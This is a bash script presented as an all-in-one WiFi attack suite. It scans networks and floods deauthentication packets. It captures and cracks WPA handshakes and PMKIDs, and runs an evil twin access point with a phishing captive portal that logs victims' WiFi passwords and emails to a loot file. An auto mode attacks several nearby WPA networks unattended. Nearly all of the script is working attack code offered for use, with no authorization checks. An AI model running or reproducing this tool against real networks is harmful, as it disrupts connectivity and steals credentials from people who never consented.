#!/bin/bash
#===============================================================================
#  NULLSEC WIFI PWNER - Complete WiFi Attack Suite
#===============================================================================
#  All-in-one WiFi attack payload for Pineapple/Pager
#  Features: Scan, Deauth, Capture, Crack, Evil Twin
#===============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

LOOT_DIR="/root/loot/nullsec-wifi"
IFACE_MON="${WIFI_IFACE:-wlan1mon}"
IFACE_AP="${AP_IFACE:-wlan0}"
WORDLIST="/usr/share/wordlists/rockyou.txt"

mkdir -p "$LOOT_DIR"/{handshakes,pmkid,captures,creds,logs}

banner() {
    echo -e "${RED}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║     ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗ ██████╗║
    ║     ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝██╔════╝║
    ║     ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗  ██║     ║
    ║     ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝  ██║     ║
    ║     ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗╚██████╗║
    ║     ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝║
    ║                    WIFI PWNER v1.0                            ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOOT_DIR/logs/pwner.log"; }
warn() { echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOOT_DIR/logs/pwner.log"; }
error() { echo -e "${RED}[✗]${NC} $1" | tee -a "$LOOT_DIR/logs/pwner.log"; }

setup_monitor() {
    log "Setting up monitor mode..."
    airmon-ng check kill 2>/dev/null
    
    if ! iw dev | grep -q "mon"; then
        airmon-ng start wlan1 2>/dev/null
        IFACE_MON="wlan1mon"
    fi
    
    log "Monitor interface: $IFACE_MON"
}

scan_networks() {
    local duration="${1:-30}"
    local output="$LOOT_DIR/captures/scan_$(date +%s)"
    
    log "Scanning for $duration seconds..."
    timeout $duration airodump-ng $IFACE_MON -w "$output" --output-format csv,pcap 2>/dev/null &
    wait
    
    if [[ -f "${output}-01.csv" ]]; then
        log "Scan complete. Networks found:"
        grep -E "^[0-9A-Fa-f]{2}:" "${output}-01.csv" | head -20 | while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            essid=$(echo "$essid" | tr -d ' ')
            [[ -n "$essid" ]] && echo "  $bssid | Ch $channel | $privacy | $essid"
        done
    fi
}

deauth_attack() {
    local target_bssid="$1"
    local client="${2:-FF:FF:FF:FF:FF:FF}"
    local count="${3:-100}"
    
    if [[ -z "$target_bssid" ]]; then
        error "Usage: deauth_attack <bssid> [client] [count]"
        return 1
    fi
    
    log "Deauthing $target_bssid (client: $client, packets: $count)"
    aireplay-ng -0 $count -a "$target_bssid" -c "$client" $IFACE_MON 2>/dev/null
}

capture_handshake() {
    local target_bssid="$1"
    local target_channel="$2"
    local target_essid="$3"
    local output="$LOOT_DIR/handshakes/hs_${target_essid}_$(date +%s)"
    
    if [[ -z "$target_bssid" ]] || [[ -z "$target_channel" ]]; then
        error "Usage: capture_handshake <bssid> <channel> [essid]"
        return 1
    fi
    
    log "Capturing handshake for $target_bssid on channel $target_channel"
    
    # Set channel
    iwconfig $IFACE_MON channel $target_channel
    
    # Start capture
    airodump-ng -c $target_channel --bssid $target_bssid -w "$output" $IFACE_MON &
    AIRODUMP_PID=$!
    
    sleep 5
    
    # Deauth to force handshake
    for i in {1..5}; do
        log "Deauth burst $i/5"
        aireplay-ng -0 10 -a $target_bssid $IFACE_MON 2>/dev/null
        sleep 3
    done
    
    sleep 10
    kill $AIRODUMP_PID 2>/dev/null
    
    # Check for handshake
    if aircrack-ng "${output}"*.cap 2>&1 | grep -q "1 handshake"; then
        log "Handshake captured: ${output}-01.cap"
        echo "${output}-01.cap" >> "$LOOT_DIR/handshakes/captured.txt"
        return 0
    else
        warn "No handshake captured"
        return 1
    fi
}

pmkid_attack() {
    local target_bssid="$1"
    local target_channel="$2"
    local output="$LOOT_DIR/pmkid/pmkid_$(date +%s)"
    
    if [[ -z "$target_bssid" ]]; then
        error "Usage: pmkid_attack <bssid> [channel]"
        return 1
    fi
    
    log "Attempting PMKID capture for $target_bssid"
    
    # Use hcxdumptool if available
    if command -v hcxdumptool &>/dev/null; then
        timeout 60 hcxdumptool -i $IFACE_MON -o "${output}.pcapng" \
            --filtermode=2 --filterlist_ap=$target_bssid 2>/dev/null
        
        if [[ -f "${output}.pcapng" ]]; then
            hcxpcapngtool -o "${output}.22000" "${output}.pcapng" 2>/dev/null
            if [[ -f "${output}.22000" ]]; then
                log "PMKID captured: ${output}.22000"
                return 0
            fi
        fi
    else
        warn "hcxdumptool not found, using alternative method..."
        # Fallback to tcpdump + manual extraction
        timeout 30 tcpdump -i $IFACE_MON -w "${output}.pcap" \
            "ether host $target_bssid and ether proto 0x888e" 2>/dev/null
    fi
    
    warn "PMKID capture may have failed"
    return 1
}

evil_twin() {
    local target_essid="$1"
    local target_channel="${2:-6}"
    
    if [[ -z "$target_essid" ]]; then
        error "Usage: evil_twin <essid> [channel]"
        return 1
    fi
    
    log "Starting Evil Twin: $target_essid on channel $target_channel"
    
    # Stop interfering services
    systemctl stop NetworkManager 2>/dev/null
    
    # Configure AP interface
    ifconfig $IFACE_AP down
    iwconfig $IFACE_AP mode master 2>/dev/null || true
    ifconfig $IFACE_AP up
    ifconfig $IFACE_AP 192.168.4.1 netmask 255.255.255.0
    
    # hostapd config
    cat > /tmp/hostapd-nullsec.conf << HOSTAPD
interface=$IFACE_AP
driver=nl80211
ssid=$target_essid
hw_mode=g
channel=$target_channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
HOSTAPD

    # dnsmasq config with logging
    cat > /tmp/dnsmasq-nullsec.conf << DNSMASQ
interface=$IFACE_AP
dhcp-range=192.168.4.10,192.168.4.50,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
log-queries
log-facility=$LOOT_DIR/logs/dns_queries.log
address=/#/192.168.4.1
DNSMASQ

    # Start captive portal
    create_captive_portal
    
    # Enable forwarding and NAT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i $IFACE_AP -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i $IFACE_AP -p tcp --dport 443 -j REDIRECT --to-port 8080
    
    # Start services
    hostapd /tmp/hostapd-nullsec.conf &
    sleep 2
    dnsmasq -C /tmp/dnsmasq-nullsec.conf &
    
    # Start credential capture
    python3 -m http.server 8080 --directory /tmp/captive &
    
    log "Evil Twin running. Credentials logged to: $LOOT_DIR/creds/"
    log "Press Ctrl+C to stop"
    
    # Deauth original network
    if [[ -n "$ORIGINAL_BSSID" ]]; then
        while true; do
            aireplay-ng -0 5 -a $ORIGINAL_BSSID $IFACE_MON 2>/dev/null
            sleep 30
        done
    else
        wait
    fi
}

create_captive_portal() {
    mkdir -p /tmp/captive
    
    cat > /tmp/captive/index.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: #16213e; padding: 30px; border-radius: 10px; }
        h2 { color: #e94560; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #e94560; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #ff6b6b; }
        .logo { text-align: center; font-size: 40px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h2>WiFi Authentication Required</h2>
        <p>Please enter your WiFi password to continue</p>
        <form action="/capture" method="POST">
            <input type="text" name="ssid" placeholder="Network Name" value="">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <input type="email" name="email" placeholder="Email (optional)">
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
HTML

    # Create capture endpoint script
    cat > /tmp/captive/capture.py << 'PYTHON'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import datetime
import os

LOOT_FILE = "/root/loot/nullsec-wifi/creds/captured.txt"

class CaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('/tmp/captive/index.html', 'rb') as f:
            content = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(content)
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        params = parse_qs(data)
        
        timestamp = datetime.datetime.now().isoformat()
        ssid = params.get('ssid', [''])[0]
        password = params.get('password', [''])[0]
        email = params.get('email', [''])[0]
        client_ip = self.client_address[0]
        
        with open(LOOT_FILE, 'a') as f:
            f.write(f"{timestamp}|{client_ip}|{ssid}|{password}|{email}\n")
        
        self.send_response(302)
        self.send_header('Location', 'http://google.com')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    os.makedirs(os.path.dirname(LOOT_FILE), exist_ok=True)
    HTTPServer(('0.0.0.0', 8080), CaptureHandler).serve_forever()
PYTHON
    chmod +x /tmp/captive/capture.py
}

crack_handshake() {
    local capfile="$1"
    local wordlist="${2:-$WORDLIST}"
    
    if [[ ! -f "$capfile" ]]; then
        error "Capture file not found: $capfile"
        return 1
    fi
    
    log "Cracking $capfile with $wordlist"
    
    # Try aircrack-ng first
    if command -v aircrack-ng &>/dev/null; then
        aircrack-ng -w "$wordlist" "$capfile" | tee "$LOOT_DIR/creds/crack_$(date +%s).txt"
    fi
    
    # Convert for hashcat if available
    if command -v hashcat &>/dev/null; then
        cap2hccapx "$capfile" "${capfile}.hccapx" 2>/dev/null
        if [[ -f "${capfile}.hccapx" ]]; then
            log "Converted to hashcat format: ${capfile}.hccapx"
            log "Run: hashcat -m 2500 ${capfile}.hccapx $wordlist"
        fi
    fi
}

auto_pwn() {
    log "Starting Auto-PWN mode..."
    
    setup_monitor
    
    # Scan
    log "Phase 1: Scanning..."
    scan_networks 60
    
    # Find targets
    local targets=$(grep -E "^[0-9A-Fa-f]{2}:" "$LOOT_DIR/captures/"*-01.csv 2>/dev/null | \
        grep -v "OPN" | head -5)
    
    if [[ -z "$targets" ]]; then
        warn "No WPA targets found"
        return 1
    fi
    
    # Attack each target
    echo "$targets" | while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        bssid=$(echo "$bssid" | tr -d ' ')
        channel=$(echo "$channel" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        
        [[ -z "$bssid" ]] && continue
        
        log "Attacking: $essid ($bssid) on channel $channel"
        
        # Try PMKID first (faster)
        pmkid_attack "$bssid" "$channel"
        
        # Then handshake
        capture_handshake "$bssid" "$channel" "$essid"
        
        sleep 5
    done
    
    log "Auto-PWN complete. Check $LOOT_DIR for results."
}

show_menu() {
    while true; do
        banner
        echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║         NULLSEC WIFI PWNER           ║${NC}"
        echo -e "${CYAN}╠═══════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  1. Setup Monitor Mode                ║${NC}"
        echo -e "${CYAN}║  2. Scan Networks                     ║${NC}"
        echo -e "${CYAN}║  3. Deauth Attack                     ║${NC}"
        echo -e "${CYAN}║  4. Capture Handshake                 ║${NC}"
        echo -e "${CYAN}║  5. PMKID Attack                      ║${NC}"
        echo -e "${CYAN}║  6. Evil Twin                         ║${NC}"
        echo -e "${CYAN}║  7. Crack Handshake                   ║${NC}"
        echo -e "${CYAN}║  8. AUTO-PWN (Full Auto)              ║${NC}"
        echo -e "${CYAN}║  9. View Loot                         ║${NC}"
        echo -e "${CYAN}║  0. Exit                              ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════╝${NC}"
        read -p "Select: " choice
        
        case $choice in
            1) setup_monitor ;;
            2) 
                read -p "Duration (30): " dur
                scan_networks "${dur:-30}"
                ;;
            3)
                read -p "Target BSSID: " bssid
                read -p "Client (FF:FF:FF:FF:FF:FF): " client
                read -p "Count (100): " count
                deauth_attack "$bssid" "${client:-FF:FF:FF:FF:FF:FF}" "${count:-100}"
                ;;
            4)
                read -p "Target BSSID: " bssid
                read -p "Channel: " ch
                read -p "ESSID: " essid
                capture_handshake "$bssid" "$ch" "$essid"
                ;;
            5)
                read -p "Target BSSID: " bssid
                read -p "Channel: " ch
                pmkid_attack "$bssid" "$ch"
                ;;
            6)
                read -p "Target ESSID: " essid
                read -p "Channel (6): " ch
                evil_twin "$essid" "${ch:-6}"
                ;;
            7)
                read -p "Capture file: " cap
                read -p "Wordlist ($WORDLIST): " wl
                crack_handshake "$cap" "${wl:-$WORDLIST}"
                ;;
            8) auto_pwn ;;
            9)
                echo -e "\n${CYAN}=== Captured Credentials ===${NC}"
                cat "$LOOT_DIR/creds/"*.txt 2>/dev/null || echo "No creds yet"
                echo -e "\n${CYAN}=== Handshakes ===${NC}"
                ls -la "$LOOT_DIR/handshakes/"*.cap 2>/dev/null || echo "No handshakes yet"
                read -p "Press Enter..."
                ;;
            0) exit 0 ;;
        esac
    done
}

# Main
case "${1:-menu}" in
    scan) shift; scan_networks "$@" ;;
    deauth) shift; setup_monitor; deauth_attack "$@" ;;
    capture) shift; setup_monitor; capture_handshake "$@" ;;
    pmkid) shift; setup_monitor; pmkid_attack "$@" ;;
    evil) shift; evil_twin "$@" ;;
    crack) shift; crack_handshake "$@" ;;
    auto) auto_pwn ;;
    menu|*) show_menu ;;
esac
